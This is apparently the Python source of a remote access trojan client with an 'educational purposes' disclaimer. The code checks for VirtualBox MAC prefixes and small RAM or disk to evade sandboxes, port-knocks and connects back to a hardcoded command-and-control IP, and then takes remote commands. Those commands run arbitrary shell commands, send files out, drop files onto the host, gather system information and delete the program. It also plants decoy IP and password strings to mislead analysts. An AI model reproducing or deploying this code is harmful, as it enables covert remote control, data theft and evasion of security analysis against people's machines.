#!/usr/bin/env python

__author__   = "rekcah"
__email__    = "rekcah@keabyte.com"
__desc__     = "For educational purposes only ;)"

import socket, _thread, os, sys, platform, subprocess, psutil, string, secrets, time

from core import Knocker
from subprocess import Popen
from sys import argv
from random import randint

#############################################
os.system('')

BUFFER = 4096
ENCODING = "utf-8"

# TODO : Add some obfuscation on the ip adress
host = "10.94.73.27"
port = int()

# The main socket
sockt = socket.socket()

GIGABYTE = 1073742000
PARANOID = False    # Sets the evasion techniques used

files = True
filename = None

# "Knockable" Ports (they're not reserved though)
portSet = [5010, 5011, 5012, 5013, 5014, 5015, 5016, 5017, 5018, 5019, 5020]

############################################
xor_key = 9852

decoy_string1 = "72.87.16.152:2257"
decoy_string2 = "216.58.204.142"
decoy_string3 = "IP:193.84.11.15|PORT:443"
decoy_string4 = "P@$$w0rD#3nC0d3D"

############################################


def evadeSandbox():
    global PARANOID, GIGABYTE
    # Fetch system informations

    # Starting by memory
    memory = psutil.virtual_memory()

    # Get the current disk usage
    disk = psutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))    # get the current disk usage

    # Get network interfaces
    network = psutil.net_if_stats()

    # It doesn't matter how paranoid you are, you just can't ignore this
    if "08:00:27" in str(network):
        # A virtualbox mac adress prefix
        # lol they're trying to sandbox us, let's giv'em a decoy
        decoyActivity(True)

    if PARANOID :
        print("paranoid mode")
        # Remember, we're completely paranoid here...
        if memory[0] <= GIGABYTE :
            # the OS has less than 1GB of RAM, Maybe a sofisticated sandbox
            # In paranoid mode we run a decoy activity
            decoyActivity(True)
        elif disk[0] <= (25 * GIGABYTE) :
            # The system has less than 25 GB of Disk on the current partition.
            # In paranoid mode we assume modern systems have more than that so let's run a decoy
            decoyActivity(True)
        elif 0 < disk[3] < 25 :
            # The curent disk has a usage between 0 and 25 percents maybe a new os ?
            # We're paranoid here so let's set a decoy
            decoyActivity(True)
    else :
        # We're less paranoid so let's change the variables
        if memory[0] <= (GIGABYTE/2):
            # the OS has less than 512MB of RAM
            decoyActivity(True)
        elif disk[0] <= (15 * GIGABYTE):
            # The system has less than 15 GB of Disk on the current partition
            decoyActivity(True)
        elif 1 < disk[3] < 2 :
            # The curent disk has a usage between 1 and 5 percents maybe a new linux OS with reserved 5% ?
            decoyActivity(True)

    # Delay the system execution runing a decoy
    decoyActivity(False)


def decoyActivity(quitWhenDone = True, delay = randint(1, 5)):
    # The decoy activity consists mailny in running multiple random generator
    # To lure memory analysis in the sandbox
    data = []
    if quitWhenDone :
        while delay > 0:
            time.sleep(1)
            data.append("".join(
                secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for _ in
                range(randint(2, 20))))
            delay -= 1
        # Exit the program as if nothing happened
        sys.exit(0)
    else :  # We don't quit the program so the rest of the code can be executed
        while delay > 0:
            time.sleep(1)
            data.append("".join(
                secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for _ in
                range(randint(2, 20))))
            delay -= 1


def knockToHeavensDoor():
    global host, portSet, port
    knocker = Knocker.Knocker(host, portSet[randint(0, len(portSet) - 1)])
    # Send knocking package
    knocker.knock()
    port = knocker.getRealPort()


def getMessages():
    global  sockt, BUFFER, ENCODING, filename, files

    while True:
        raw = sockt.recv(BUFFER)

        data = raw.decode()
        # here is the place to decrypt the received data
        # maybe the xor function here

        # we've got the data now the fun begins : parsing :P
        if data.upper() == "KILL":
            # Kill the process
            sockt.send("Kiling the snitch... Bye!".encode(ENCODING))
            sockt.close()
            sys.exit(0)
        elif data.upper() == "REMOVE":
            # remove the executable
            os.remove(argv[0])
            # exit the program
            sockt.send("Removing the snitch... Bye!".encode(ENCODING))
            sockt.close()
            sys.exit(0)
        elif data.upper() == "GETINFO":
            # collect informations
            info = "\n\tArchitecture : " + str(platform.machine()) \
                   + "\n\tSystem : " + str(platform.system()) \
                   + "\n\tUname : " + str(platform.uname()) \
                   + "\n\tRelease : " + str(platform.release()) \
                   + "\n\tOS Version : " + str(platform.version())

            # Get the Informations from the psutil module
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))
            network = psutil.net_if_stats()
            info += "\n\tTotal RAM : " + str(memory[0]) \
                    + "\n\tAvailable RAM : " + str(memory[1]) \
                    + "\n\tRAM usage : " + str(memory[2]) \
                    + "%\n\tUsed RAM : " + str(memory[3]) \
                    + "\n\tFree RAM : " + str(memory[4]) \
                    + "\n\tActive RAM : " + str(memory[5]) \
                    + "\n\tInactive RAM : " + str(memory[6]) \
                    + "\n\tBuffers : " + str(memory[7]) \
                    + "\n\tCached Memory : " + str(memory[8]) \
                    + "\n\tShared Memory : " + str(memory[9]) \
                    + "\n\tTotal Disk Available : " + str(disk[0]) \
                    + "\n\tDisk space used : " + str(disk[1]) \
                    + "\n\tDisk space free : " + str(disk[2]) \
                    + "\n\tDisk usage : " + str(disk[3]) \
                    + "\n\tNetwork inttefaces : " + str(network)
            sockt.send(str(info).encode(ENCODING))
        else :
            if "SHELL" in data.upper() :
                sub = data.split(" ")
                if len(sub) >= 1 :
                    #possibly well formed shell command. Let's execute it
                    op = Popen([data[6:]], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    if op:
                        output = str(op.stdout.read())
                        sockt.send(bytes(output, ENCODING))
                    else:
                        err = str(op.stderr.read())
                        sockt.send(bytes(err, ENCODING))
            elif "GETFILE" in data.upper() :
                args = data.split(" ")
                if len(args) == 2 :
                    if os.path.isfile(args[1]):
                        # File exists we can send it
                        with open(args[1], "rb") as file:
                            buff = file.read(BUFFER)
                            sockt.send("!FILE!".encode(ENCODING))
                            time.sleep(2)
                            # start sending the file
                            while buff :
                                sockt.send(buff)
                                buff = file.read(BUFFER)
                        sockt.send("!ENDFILE!".encode(ENCODING))
                    else:
                        sockt.send("REQUESTED FILE DOES NOT EXISTS".encode("utf-8"))
            elif "SENDFILE" in data.upper() :
                args = data.split(" ")
                if len(args) == 4 :
                    if not os.path.isdir(str(args[2])) :
                        # create the folder if it doesn't exists
                        os.mkdir(str(args[2]))
                    # Create the full filename
                    filename = str(args[2] + args[3])
                    # Get ready to receive files
                    files = True
            elif "!FILE!" in data.upper() :
                # The C&C is sending a file!
                # Awesome, let's read it!
                if files:
                    # We're expecting a file
                    file = open(str(filename), "wb")
                    # read bytes
                    while "!ENDFILE!" not in data.upper():
                        tmp = sockt.recv(BUFFER)
                        data = tmp.decode(ENCODING)
                        if "!ENDFILE!" not in data.upper():
                            raw += tmp
                    file.write(raw)
                    file.close()
                    files = False
                    filename = None
                else :
                    # We're not expecing a file but we need to read it to empty the socket
                    while "!ENDFILE!" not in data.upper():
                        tmp = sockt.recv(BUFFER)
                        data = tmp.decode(ENCODING)


def main():
    global  sockt, host, port, xor_key, decoy_string1, decoy_string2, decoy_string3, decoy_string4

    # Call the sandbox evasion
    evadeSandbox()
    #Call the knocker here
    knockToHeavensDoor()
    #wait before connecting
    decoy_string1.split("a")
    decoy_string2.join("")
    time.sleep(5)
    #try to connect
    try:
        print("Connecting to [%s,%d]" % (host, port))
        sockt.connect((host, port))
    except Exception as e :
        print("Error... %s" + str(e))

    _thread.start_new_thread(getMessages, ())

    while True:
        pass

if __name__ == "__main__":
    main()